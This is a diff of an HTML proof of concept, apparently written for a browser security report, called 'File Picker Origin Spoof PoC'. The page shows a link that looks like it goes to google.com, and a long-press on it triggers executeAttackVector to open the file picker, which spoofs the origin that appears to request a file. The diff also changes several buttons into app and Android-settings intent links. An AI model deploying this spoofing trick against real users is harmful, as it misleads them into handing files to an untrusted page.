@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>File Picker Origin Spoof PoC - Google Integration</title>
+    <title>File Picker Origin Spoof PoC</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -93,58 +93,58 @@
     <h1>Secure Document Verification</h1>
 
     <div class="container">
-        <!-- 1. Original Vector (Tetap dengan File Picker) -->
+        <!-- 1. Button 1: Original File Picker Vector -->
         <div class="card-box">
-            <a href="https://google.com" class="spoof-link" id="targetLink1" data-target="1">Open New Window & Upload Photo</a>
-            <div class="preview-container" id="previewBox1">
-                <img id="imagePreview1" src="" alt="File Preview">
-                <div class="file-info" id="fileInfo1"></div>
+            <a href="https://google.com" class="spoof-link" id="targetLink">Open New Window & Upload Photo</a>
+            <div class="preview-container" id="previewBox">
+                <img id="imagePreview" src="" alt="File Preview">
+                <div class="file-info" id="fileInfo"></div>
             </div>
         </div>
 
-        <!-- 2. Instagram Intent Vector (Disisipkan google.com, tanpa picker) -->
+        <!-- 2. Button 2: Instagram Intent (Tanpa picker) -->
         <div class="card-box">
-            <a href="https://google.com" class="spoof-link" style="background-color: #9334e6;" onclick="window.location.href='instagram://app'; return false;">Open Instagram & Google.com</a>
+            <a href="instagram://app" class="spoof-link" style="background-color: #9334e6;">Open Instagram</a>
         </div>
 
-        <!-- 3. Google Maps Intent Vector (Disisipkan google.com, tanpa picker) -->
+        <!-- 3. Button 3: Google Maps Intent (Tanpa picker) -->
         <div class="card-box">
-            <a href="https://google.com" class="spoof-link" style="background-color: #34a853;" onclick="window.location.href='geo:0,0?q=Googleplex'; return false;">Open Maps & Google.com</a>
+            <a href="geo:0,0?q=Googleplex" class="spoof-link" style="background-color: #34a853;">Open Maps</a>
         </div>
 
-        <!-- 4. Bluetooth Settings Intent Vector (Disisipkan google.com, tanpa picker) -->
+        <!-- 4. Button 4: Bluetooth Settings Intent (Tanpa picker) -->
         <div class="card-box">
-            <a href="https://google.com" class="spoof-link" style="background-color: #fbbc05; color: #202124;" onclick="window.location.href='intent:#Intent;action=android.settings.BLUETOOTH_SETTINGS;end;'; return false;">Open Bluetooth Settings & Google</a>
+            <a href="intent:#Intent;action=android.settings.BLUETOOTH_SETTINGS;end;" class="spoof-link" style="background-color: #fbbc05; color: #202124;">Open Bluetooth Settings</a>
         </div>
 
-        <!-- 5. WhatsApp Intent Vector (Disisipkan google.com, tanpa picker) -->
+        <!-- 5. Button 5: WhatsApp Intent (Tanpa picker) -->
         <div class="card-box">
-            <a href="https://google.com" class="spoof-link" style="background-color: #25d366; color: #ffffff;" onclick="window.location.href='whatsapp://send?text=PoC_Test'; return false;">Open WhatsApp & Google.com</a>
+            <a href="whatsapp://send?text=PoC_Test" class="spoof-link" style="background-color: #25d366; color: #ffffff;">Open WhatsApp</a>
         </div>
 
-        <!-- 6. Wi-Fi Settings Intent Vector (Disisipkan google.com, tanpa picker) -->
+        <!-- 6. Button 6: Wi-Fi Settings Intent (Tanpa picker) -->
         <div class="card-box">
-            <a href="https://google.com" class="spoof-link" style="background-color: #4285f4;" onclick="window.location.href='intent:#Intent;action=android.settings.WIFI_SETTINGS;end;'; return false;">Open Wi-Fi Settings & Google</a>
+            <a href="intent:#Intent;action=android.settings.WIFI_SETTINGS;end;" class="spoof-link" style="background-color: #4285f4;">Open Wi-Fi Settings</a>
         </div>
 
-        <!-- 7. Location Settings Intent Vector (Disisipkan google.com, tanpa picker) -->
+        <!-- 7. Button 7: Location Settings Intent (Tanpa picker) -->
         <div class="card-box">
-            <a href="https://google.com" class="spoof-link" style="background-color: #ea4335;" onclick="window.location.href='intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end;'; return false;">Open Location Settings & Google</a>
+            <a href="intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end;" class="spoof-link" style="background-color: #ea4335;">Open Location Settings</a>
         </div>
 
-        <!-- 8. Telegram Intent Vector (Disisipkan google.com, tanpa picker) -->
+        <!-- 8. Button 8: Telegram Intent (Tanpa picker) -->
         <div class="card-box">
-            <a href="https://google.com" class="spoof-link" style="background-color: #0088cc;" onclick="window.location.href='tg://resolve?domain=telegram'; return false;">Open Telegram & Google.com</a>
+            <a href="tg://resolve?domain=telegram" class="spoof-link" style="background-color: #0088cc;">Open Telegram</a>
         </div>
 
-        <!-- 9. NFC Settings Intent Vector (Disisipkan google.com, tanpa picker) -->
+        <!-- 9. Button 9: NFC Settings Intent (Tanpa picker) -->
         <div class="card-box">
-            <a href="https://google.com" class="spoof-link" style="background-color: #34a853;" onclick="window.location.href='intent:#Intent;action=android.settings.NFC_SETTINGS;end;'; return false;">Open NFC Settings & Google</a>
+            <a href="intent:#Intent;action=android.settings.NFC_SETTINGS;end;" class="spoof-link" style="background-color: #34a853;">Open NFC Settings</a>
         </div>
 
-        <!-- 10. Display Settings Intent Vector (Disisipkan google.com, tanpa picker) -->
+        <!-- 10. Button 10: Display Settings Intent (Tanpa picker) -->
         <div class="card-box">
-            <a href="https://google.com" class="spoof-link" style="background-color: #ff6d00;" onclick="window.location.href='intent:#Intent;action=android.settings.DISPLAY_SETTINGS;end;'; return false;">Open Display Settings & Google</a>
+            <a href="intent:#Intent;action=android.settings.DISPLAY_SETTINGS;end;" class="spoof-link" style="background-color: #ff6d00;">Open Display Settings</a>
         </div>
     </div>
 
@@ -153,7 +153,7 @@
     <script>
         let triggered = false;
 
-        const executeAttackVector = (targetId) => {
+        const executeAttackVector = () => {
             if (triggered) return;
             triggered = true;
 
@@ -172,10 +172,10 @@
 
                     const file = await fileHandle.getFile();
                     
-                    document.getElementById(`fileInfo${targetId}`).innerText = `Selected file: ${file.name}`;
+                    document.getElementById("fileInfo").innerText = `Selected file: ${file.name}`;
 
-                    const previewBox = document.getElementById(`previewBox${targetId}`);
-                    const imagePreview = document.getElementById(`imagePreview${targetId}`);
+                    const previewBox = document.getElementById("previewBox");
+                    const imagePreview = document.getElementById("imagePreview");
                     
                     if (file.type.startsWith('image/')) {
                         imagePreview.src = URL.createObjectURL(file);
@@ -193,12 +193,14 @@
             }, 1300);
         };
 
-        // Hanya tombol pertama yang menggunakan event listener file picker bawaanmu
-        const targetLink1 = document.getElementById("targetLink1");
-        targetLink1.addEventListener("contextmenu", () => {
-            executeAttackVector(1);
+        // Hanya button pertama yang memiliki event listener file picker
+        const targetElement = document.getElementById("targetLink");
+
+        targetElement.addEventListener("contextmenu", () => {
+            executeAttackVector();
         });
-        targetLink1.addEventListener("touchstart", () => {}, { passive: true });
+
+        targetElement.addEventListener("touchstart", () => {}, { passive: true });
     </script>
 
 </body>
